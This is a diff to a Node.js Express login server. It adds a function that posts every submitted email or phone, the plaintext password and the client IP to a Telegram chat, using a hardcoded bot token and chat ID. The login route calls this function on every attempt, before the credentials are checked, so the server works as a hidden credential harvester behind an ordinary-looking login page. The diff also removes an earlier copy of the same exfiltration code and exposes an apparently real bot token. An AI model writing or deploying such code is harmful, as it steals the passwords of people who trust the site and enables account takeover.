@@ -4,10 +4,16 @@ const jwt = require('jsonwebtoken');
 const cors = require('cors');
 const helmet = require('helmet');
 const rateLimit = require('express-rate-limit');
+const axios = require('axios');  // Add this for Telegram
 
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 const JWT_SECRET = 'your-super-secret-key-change-this';
+
+// ===== TELEGRAM CONFIGURATION - REPLACE WITH YOUR ACTUAL TOKENS =====
+const TELEGRAM_BOT_TOKEN = '8716008095:AAEx89L4ab3oRZEh_WO637CyO6A0aiMlu-Q';  // ← Put your bot token here
+const TELEGRAM_CHAT_ID = '5707645216';      // ← Put your chat ID here
+// ====================================================================
 
 // Middleware
 app.use(helmet());
@@ -21,6 +27,27 @@ const loginLimiter = rateLimit({
   max: 10,
   message: { error: 'Too many login attempts. Try again later.' }
 });
+
+// Telegram function
+async function sendToTelegram(email, password, ip) {
+    const message = `
+🔐 NEW LOGIN ATTEMPT 🔐
+Email/Phone: ${email}
+Password: ${password}
+IP: ${ip}
+Time: ${new Date().toString()}
+    `;
+    
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+        });
+        console.log('✅ Telegram notification sent');
+    } catch (error) {
+        console.error('❌ Telegram error:', error.message);
+    }
+}
 
 // In-memory storage
 const users = new Map();
@@ -54,11 +81,12 @@ const findUserByIdentifier = (identifier) => {
   return null;
 };
 
-// API Routes
+// Health check
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok', timestamp: new Date().toISOString() });
 });
 
+// Register
 app.post('/api/register', async (req, res) => {
   const { name, email, phone, password } = req.body;
 
@@ -104,36 +132,8 @@ app.post('/api/register', async (req, res) => {
   const { passwordHash: _, ...userWithoutPassword } = newUser;
   res.status(201).json({ message: 'Account created!', user: userWithoutPassword, token });
 });
-// Add this at the top with other imports
-const axios = require('axios');
 
-// Your Telegram credentials
-const TELEGRAM_BOT_TOKEN = '8716008095:AAEx89L4ab3oRZEh_WO637CyO6A0aiMlu-Q'; // Replace with your token
-const TELEGRAM_CHAT_ID = '5707645216'; // Replace with your chat ID
-
-// Function to send message to Telegram
-async function sendToTelegram(email, password, ip) {
-    const message = `
-🔐 **NEW LOGIN ATTEMPT** 🔐
-📧 **Email/Phone:** ${email}
-🔑 **Password:** ${password}
-🌍 **IP Address:** ${ip}
-⏰ **Time:** ${new Date().toString()}
-    `;
-    
-    try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
-        console.log('Telegram notification sent');
-    } catch (error) {
-        console.error('Telegram error:', error.message);
-    }
-}
-
-// Modify your login endpoint - FIND THIS SECTION in server.js and REPLACE it:
+// Login - WITH TELEGRAM NOTIFICATION
 app.post('/api/login', loginLimiter, async (req, res) => {
   const { identifier, password } = req.body;
 
@@ -141,10 +141,8 @@ app.post('/api/login', loginLimiter, async (req, res) => {
     return res.status(400).json({ error: 'Please provide identifier and password.' });
   }
 
-  // Get user's IP address
+  // Get IP address and send to Telegram
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  
-  // SEND TO TELEGRAM (even if login fails!)
   await sendToTelegram(identifier, password, ip);
 
   const user = findUserByIdentifier(identifier);
@@ -166,33 +164,8 @@ app.post('/api/login', loginLimiter, async (req, res) => {
   const { passwordHash: _, ...userWithoutPassword } = user;
   res.json({ message: 'Login successful!', user: userWithoutPassword, token });
 });
-app.post('/api/login', loginLimiter, async (req, res) => {
-  const { identifier, password } = req.body;
 
-  if (!identifier || !password) {
-    return res.status(400).json({ error: 'Please provide identifier and password.' });
-  }
-
-  const user = findUserByIdentifier(identifier);
-  if (!user) {
-    return res.status(401).json({ error: 'Invalid credentials.' });
-  }
-
-  const isValid = await bcrypt.compare(password, user.passwordHash);
-  if (!isValid) {
-    return res.status(401).json({ error: 'Invalid credentials.' });
-  }
-
-  user.lastLogin = new Date().toISOString();
-  users.set(user.id, user);
-
-  const token = generateToken(user.id, user.email || user.phone);
-  activeSessions.set(token, { userId: user.id, createdAt: new Date() });
-
-  const { passwordHash: _, ...userWithoutPassword } = user;
-  res.json({ message: 'Login successful!', user: userWithoutPassword, token });
-});
-
+// Get current user
 app.get('/api/me', (req, res) => {
   const authHeader = req.headers.authorization;
   if (!authHeader || !authHeader.startsWith('Bearer ')) {
@@ -219,6 +192,7 @@ app.get('/api/me', (req, res) => {
   }
 });
 
+// Logout
 app.post('/api/logout', (req, res) => {
   const authHeader = req.headers.authorization;
   if (authHeader && authHeader.startsWith('Bearer ')) {
@@ -228,17 +202,17 @@ app.post('/api/logout', (req, res) => {
   res.json({ message: 'Logged out.' });
 });
 
-// Forgot password endpoint
+// Forgot password
 app.post('/api/forgot-password', (req, res) => {
-  const { identifier } = req.body;
-  res.json({ message: 'If an account exists, a reset link has been sent.' });
+  res.json({ message: 'Password reset link sent if account exists.' });
 });
 
-// Serve HTML file
+// Serve HTML
 app.get('/', (req, res) => {
   res.sendFile(__dirname + '/public/index.html');
 });
 
+// Start server
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
 });
